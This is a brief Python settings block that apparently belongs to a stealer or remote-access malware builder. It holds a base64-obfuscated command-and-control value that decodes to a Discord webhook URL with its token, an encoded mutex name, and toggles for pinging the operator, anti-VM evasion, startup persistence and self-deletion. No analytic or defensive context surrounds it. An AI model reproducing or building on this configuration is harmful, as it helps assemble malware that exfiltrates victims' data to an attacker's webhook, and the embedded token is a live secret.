...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1NjM3ODk2OTcxMjEwMzQyNS9rUjd0dkxWdmJBYTZXZWVpdGFCdWFlWDZESlpna2xjTHRpMFBpbkh1YjN5Y21JRWRLVjhpa29XeEZFcVFZUkdVaFBJRg==').decode())
    Mutex = base64.b64decode('cGNBVUp6NkdrcktYUVFVMw==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
